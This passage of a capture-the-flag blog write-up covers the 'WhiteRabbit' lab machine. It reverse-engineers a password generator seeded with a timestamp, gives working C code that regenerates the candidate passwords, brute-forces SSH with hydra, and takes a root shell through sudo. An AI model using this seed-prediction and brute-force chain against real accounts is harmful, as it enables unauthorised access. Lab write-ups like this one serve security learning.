	<span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
			<span class="cm">/* WARNING: Subroutine does not return */</span>
		<span class="n">__stack_chk_fail</span><span class="p">();</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The program takes the current system time, converts it into milliseconds, and feeds that value into <code class="language-plaintext highlighter-rouge">generate_password()</code> . The output password therefore depends entirely on the exact moment the program was executed.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gettimeofday</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_28</span><span class="p">,</span> <span class="p">(</span><span class="n">__timezone_ptr_t</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
</code></pre></div></div>

<ul>
  <li>Retrieves the current time with microsecond precision</li>
  <li><code class="language-plaintext highlighter-rouge">local_28.tv_sec</code>  seconds since EPOCH</li>
  <li><code class="language-plaintext highlighter-rouge">local _ 28.tv_usec</code>  microseconds within that second</li>
</ul>

<p>The code then converts the time to milliseconds .</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">local_28</span><span class="p">.</span><span class="n">tv_sec</span> <span class="o">*</span> <span class="mi">1000</span> <span class="o">+</span> <span class="n">local_28</span><span class="p">.</span><span class="n">tv_usec</span> <span class="o">/</span> <span class="mi">1000</span>
</code></pre></div></div>

<p>This calculates:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">milliseconds</span> <span class="o">=</span> <span class="p">(</span><span class="n">seconds</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">microseconds</span> <span class="o">/</span> <span class="mi">1000</span><span class="p">)</span>
</code></pre></div></div>

<p>This is the exact value passed to <code class="language-plaintext highlighter-rouge">generate_password()</code> . This means the entire password depends on:</p>
<ul>
  <li>The current EPOCH time,</li>
  <li>Rounded to the nearest millisecond.</li>
</ul>

<p>Then we decompile the <code class="language-plaintext highlighter-rouge">generate_password()</code> function.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">generate_password</span><span class="p">(</span><span class="n">uint</span> <span class="n">param_1</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
	<span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">local_34</span><span class="p">;</span>
	<span class="kt">char</span> <span class="n">local_28</span> <span class="p">[</span><span class="mi">20</span><span class="p">];</span>
	<span class="n">undefined1</span> <span class="n">local_14</span><span class="p">;</span>
	<span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
	
	
	<span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
	<span class="n">srand</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
	<span class="k">for</span> <span class="p">(</span><span class="n">local_34</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_34</span> <span class="o">&lt;</span> <span class="mh">0x14</span><span class="p">;</span> <span class="n">local_34</span> <span class="o">=</span> <span class="n">local_34</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">iVar1</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
	<span class="n">local_28</span><span class="p">[</span><span class="n">local_34</span><span class="p">]</span> <span class="o">=</span>
	<span class="s">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span><span class="p">[</span><span class="n">iVar1</span> <span class="o">%</span> <span class="mh">0x3e</span><span class="p">];</span>
	<span class="p">}</span>
	<span class="n">local_14</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">puts</span><span class="p">(</span><span class="n">local_28</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
			<span class="cm">/* WARNING: Subroutine does not return */</span>
		<span class="n">__stack_chk_fail</span><span class="p">();</span>
	<span class="p">}</span>
	<span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We see the following variable which can be broken down into the following translations.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
<span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">local_34</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">local_28</span> <span class="p">[</span><span class="mi">20</span><span class="p">];</span>
<span class="n">undefined1</span> <span class="n">local_14</span><span class="p">;</span>
<span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">local_28[20]</code> : buffer to hold the generated password characters.</li>
  <li><code class="language-plaintext highlighter-rouge">local_34</code> : loop counter</li>
  <li><code class="language-plaintext highlighter-rouge">local_14 </code>: single byte, used as a terminator (effectively the ‘\0’ ).</li>
  <li>` local_10` : stack canary copy (for stack smashing protection).</li>
  <li><code class="language-plaintext highlighter-rouge">param_1</code> : the seed for the PRNG which is the timestamp in milliseconds</li>
</ul>

<p>Then the application creates a seed from the timestamp:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">srand</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
</code></pre></div></div>

<p>The binary then generates 20 characters of the password.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span><span class="n">local_34</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_34</span> <span class="o">&lt;</span> <span class="mh">0x14</span><span class="p">;</span> <span class="n">local_34</span> <span class="o">=</span> <span class="n">local_34</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
<span class="n">iVar1</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
<span class="n">local_28</span><span class="p">[</span><span class="n">local_34</span><span class="p">]</span> <span class="o">=</span>
<span class="s">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span><span class="p">[</span><span class="n">iVar1</span> <span class="o">%</span> <span class="mh">0x3e</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div>
<ul>
  <li>Loop runs while <code class="language-plaintext highlighter-rouge">local_34 &lt; 0x14</code> → <code class="language-plaintext highlighter-rouge">0x14 </code>in hex = 20 decimal. So it runs 20 iterations: <code class="language-plaintext highlighter-rouge">local_34 = 0 .. 19 </code>.</li>
  <li><code class="language-plaintext highlighter-rouge">iVar1 = rand();</code>  generates a pseudo-random integer based on the seed ( param_1 ).</li>
  <li>Character set string:
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>
</code></pre></div>    </div>
  </li>
  <li><code class="language-plaintext highlighter-rouge">iVar1 % 0x3e</code> :
    <ul>
      <li><code class="language-plaintext highlighter-rouge">0x3e </code>in hex = 62 decimal.</li>
      <li>So the binary performs <code class="language-plaintext highlighter-rouge">rand() % 62</code> → random index from 0–61 into that character set.</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">local_28[local_34] = charset[iVar1 % 62];</code>
    <ul>
      <li>Each iteration picks one character from that 62-char alphabet and stores it into <code class="language-plaintext highlighter-rouge">local_28 </code>.</li>
      <li>After the loop, local_28 contains 20 random-looking characters from [a-zA-Z0-9] .</li>
    </ul>
  </li>
</ul>

<p>Then <code class="language-plaintext highlighter-rouge">local_14</code> is placed immediately after local_28 . So effectively:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">local_28 </code>occupies 20 bytes.</li>
  <li><code class="language-plaintext highlighter-rouge">local_14</code> is the next byte on the stack.
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">puts</span><span class="p">(</span><span class="n">local_20</span><span class="p">);</span>
</code></pre></div>    </div>
  </li>
</ul>

<p>Finally, the binary then prints the generated password with a newline which from the <code class="language-plaintext highlighter-rouge">command_log</code> history is used to pipe into the <code class="language-plaintext highlighter-rouge">passwd</code> utility. We already know the date at which the exact command was issued for the password reset for <code class="language-plaintext highlighter-rouge">neo</code>, which happened on <strong>2024-08-30 at 14:40:42</strong> , so we can construct our own binary that will generate a list of passwords can be used to brute force the neo user’s account.</p>

<p><strong>Constructing Our Binary</strong></p>
<hr />
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="cp">#define PASSWORD_LENGTH 20
</span>
<span class="k">const</span> <span class="kt">char</span> <span class="n">CHARSET</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span><span class="p">;</span>

<span class="k">const</span> <span class="kt">int</span> <span class="n">CHARSET_SIZE</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CHARSET</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>


<span class="kt">void</span> <span class="nf">generate_password</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">seed</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">out</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">);</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">PASSWORD_LENGTH</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="n">CHARSET_SIZE</span><span class="p">;</span>
		<span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">CHARSET</span><span class="p">[</span><span class="n">index</span><span class="p">];</span>
	<span class="p">}</span>
	<span class="n">out</span><span class="p">[</span><span class="n">PASSWORD_LENGTH</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="c1">// using https://www.epochconverter.com/</span>
	<span class="c1">// 2024-08-30 14:40:42 = 1725028842</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">timestamp</span> <span class="o">=</span> <span class="mi">1725028842</span><span class="p">;</span>
	<span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="n">PASSWORD_LENGTH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
	
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">ms</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">ms</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="n">ms</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="c1">// Convert to milliseconds and add microseconds from 0-1000 as our range</span>
		<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">seed</span> <span class="o">=</span> <span class="n">timestamp</span> <span class="o">*</span> <span class="mi">1000</span> <span class="o">+</span> <span class="n">ms</span><span class="p">;</span>
		<span class="n">generate_password</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>
	<span class="p">}</span>
	
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p>Let’s break down the functionality.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define PASSWORD_LENGTH 20
</span><span class="k">const</span> <span class="kt">char</span> <span class="n">CHARSET</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">int</span> <span class="n">CHARSET_SIZE</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">CHARSET</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">PASSWORD_LENGTH</code> is 20 and matches the <code class="language-plaintext highlighter-rouge">l</code>oop local_34<code class="language-plaintext highlighter-rouge"> &lt; 0x14</code> in <code class="language-plaintext highlighter-rouge">generate_password</code> .</li>
  <li><code class="language-plaintext highlighter-rouge">CHARSET</code> is exactly the same 62-character string from the decompiled function.</li>
  <li><code class="language-plaintext highlighter-rouge">CHARSET_SIZE</code> is <code class="language-plaintext highlighter-rouge">sizeof(CHARSET) - 1</code> (subtract 1 to ignore the <code class="language-plaintext highlighter-rouge">'\0'</code> terminator), so it’s 62 . This corresponds to the <code class="language-plaintext highlighter-rouge">% 0x3e ( % 62 )</code> in the original binary.</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">generate_password</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">seed</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">out</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">);</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">PASSWORD_LENGTH</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="n">CHARSET_SIZE</span><span class="p">;</span>
		<span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">CHARSET</span><span class="p">[</span><span class="n">index</span><span class="p">];</span>
	<span class="p">}</span>
	<span class="n">out</span><span class="p">[</span><span class="n">PASSWORD_LENGTH</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This is a reconstruction of the <code class="language-plaintext highlighter-rouge">generate_password()</code> function:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">srand(seed);</code>
    <ul>
      <li>Same as s<code class="language-plaintext highlighter-rouge">rand(param_1);</code> in the binary.</li>
    </ul>
  </li>
  <li>Loop <code class="language-plaintext highlighter-rouge">i = 0; i &lt; PASSWORD_LENGTH; i++</code> :
    <ul>
      <li>Same as <code class="language-plaintext highlighter-rouge">for (local_34 = 0; local_34 &lt; 0x14; local_34++) .</code></li>
    </ul>
  </li>
  <li>`rand() % CHARSET_SIZE :
    <ul>
      <li>Same as <code class="language-plaintext highlighter-rouge">iVar1 = rand(); ... [iVar1 % 0x3e]</code> .</li>
      <li>Gives an index 0–61 into <code class="language-plaintext highlighter-rouge">CHARSET</code> .</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">out[PASSWORD_LENGTH] = '\0';</code>
    <ul>
      <li>Equivalent to their <code class="language-plaintext highlighter-rouge">local_14 = 0; </code>trick (null terminator placed after the 20 chars).</li>
      <li>Ensures <code class="language-plaintext highlighter-rouge">out</code> is a valid C string.</li>
    </ul>
  </li>
</ul>

<p>So given a <code class="language-plaintext highlighter-rouge">seed</code> value (the millisecond timestamp), this function returns exactly the same 20-character password the original binary would print. Lets analyse the main function of our new binary.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">timestamp</span> <span class="o">=</span> <span class="mi">1725028842</span><span class="p">;</span>
	<span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="n">PASSWORD_LENGTH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
	
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">ms</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">ms</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">;</span> <span class="n">ms</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">seed</span> <span class="o">=</span> <span class="n">timestamp</span> <span class="o">*</span> <span class="mi">1000</span> <span class="o">+</span> <span class="n">ms</span><span class="p">;</span>
		<span class="n">generate_password</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>
	<span class="p">}</span>
	
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">timestamp = 1725028842;</code>
    <ul>
      <li>This is the <code class="language-plaintext highlighter-rouge">tv_sec</code> from the command log (Unix timestamp in seconds) which can be converted from the known date from <a href="https://www.epochconverter.com/">Epoch Converter</a></li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">for (int ms = 0; ms &lt; 1000; ms++) { ... }</code>
    <ul>
      <li>Loops over all possible millisecond values 0..999 .</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">seed = timestamp * 1000 + ms;</code>
    <ul>
      <li>This reproduces what <code class="language-plaintext highlighter-rouge">main()</code> did in the original <code class="language-plaintext highlighter-rouge">neo-password-generator</code> binary:   <code class="language-plaintext highlighter-rouge">seed = tv_sec * 1000 + tv_usec / 1000;</code></li>
      <li>Since we only know <code class="language-plaintext highlighter-rouge">tv_sec</code> from the DB and not <code class="language-plaintext highlighter-rouge">tv_usec </code>, we attempt to brute force all 1000 possibilities for <code class="language-plaintext highlighter-rouge">tv_usec/1000</code> .</li>
    </ul>
  </li>
  <li>For each seed :
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">generate_password</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">password</span><span class="p">);</span>
</code></pre></div>    </div>
  </li>
  <li>Generates passwords with 20 characters each for that specific millisecond.</li>
  <li>Prints it, one per line.</li>
</ul>

<p>This results in 1000 possible passwords, one of which is exactly the password that was generated when the<code class="language-plaintext highlighter-rouge"> neo</code> user’s password generator ran.</p>

<p><strong>Exploitation</strong></p>

<p>We save the code into a file named <code class="language-plaintext highlighter-rouge">password_generator.c</code> , compile it then verify that a list of passwords were created.</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads]
└─<span class="nv">$ </span>gcc password_generator.c 

┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads]
└─<span class="nv">$ </span>gcc password_generator.c <span class="nt">-o</span> password_generator                                
┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads]
└─<span class="nv">$ </span>./password_generator <span class="o">&gt;</span> passwords.txt                                          
┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads]
└─<span class="nv">$ </span><span class="nb">cat </span>passwords.txt  | <span class="nb">head</span> <span class="nt">-n</span> 10
L7Qf2aFEohexxuk07tEw
hN6DEuEFtQ5LZX8uxw9r
lWL7jrjJTC54qDojrCvV
mnQ1II9iyvPJRhLBMVfB
XSfLZ30sr8sjDJbx8geU
cOBXPQDByTiWBDDEYJXK
R4njydUwbk3uML4yVoT9
gUepuICfnxFcf7e7K7RA
c4L87irvHxX7pZGX9if6
Y7a6NqegKAmmdunHc6Uq
</code></pre></div></div>

<p>Now we can use a tool like <code class="language-plaintext highlighter-rouge">hydra</code> to attempt to brute force the <code class="language-plaintext highlighter-rouge">neo</code> user’s SSH password.</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Downloads]
└─<span class="nv">$ </span>hydra <span class="nt">-l</span> neo <span class="nt">-P</span> passwords.txt ssh://whiterabbit.htb
Hydra v9.6 <span class="o">(</span>c<span class="o">)</span> 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes <span class="o">(</span>this is non-binding, these <span class="k">***</span> ignore laws and ethics anyway<span class="o">)</span><span class="nb">.</span>

Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2025-12-16 15:15:06
<span class="o">[</span>WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use <span class="nt">-t</span> 4
<span class="o">[</span>DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries <span class="o">(</span>l:1/p:1000<span class="o">)</span>, ~63 tries per task
<span class="o">[</span>DATA] attacking ssh://whiterabbit.htb:22/
<span class="o">[</span>22][ssh] host: whiterabbit.htb   login: neo   password: <span class="o">[</span>REDACTED]
1 of 1 target successfully completed, 1 valid password found
<span class="o">[</span>WARNING] Writing restore file because 1 final worker threads did not <span class="nb">complete </span><span class="k">until </span>end.
<span class="o">[</span>ERROR] 1 target did not resolve or could not be connected
<span class="o">[</span>ERROR] 0 target did not <span class="nb">complete
</span>Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2025-12-16 15:15:45
</code></pre></div></div>

<p>We successfully bruteforced <code class="language-plaintext highlighter-rouge">neo 's</code> password which turned out to be [REDACTED] . Then, we can log in to the target using this password via SSH.</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh neo@whiterabbit.htb                                                                                
neo@whiterabbit.htb<span class="s1">'s password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the '</span>unminimize<span class="s1">' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Dec 16 09:19:05 2025 from 10.10.16.92
neo@whiterabbit:~$ sudo -l 
[sudo] password for neo: 
Matching Defaults entries for neo on whiterabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User neo may run the following commands on whiterabbit:
    (ALL : ALL) ALL
neo@whiterabbit:~$ sudo bash 
root@whiterabbit:/home/neo# ls -l /root/root.txt
-rw-r----- 1 root root 33 Dec 15 19:31 /root/root.txt
</span></code></pre></div></div>

<p>Finally we got access to the root shell and got the root flag, thus successfully compromising the target and completing the machine.</p>


  </div>

  <div style="margin-top: 50px;">
    <a href="/"><< cd ..</a>
  </div>

</article>
      </div>
    </main>

    <footer>
    <div class="container">
        <p>&copy; 2025 Naved Khan. All rights reserved.</p>
        <p>Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <span
                style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol';">☕</span>
        </p>
        <div class="scancode">
            Scanning port 80... [OPEN]
        </div>
    </div>
</footer>

    <script src="/assets/js/matrix.js"></script>

  </body>

</html>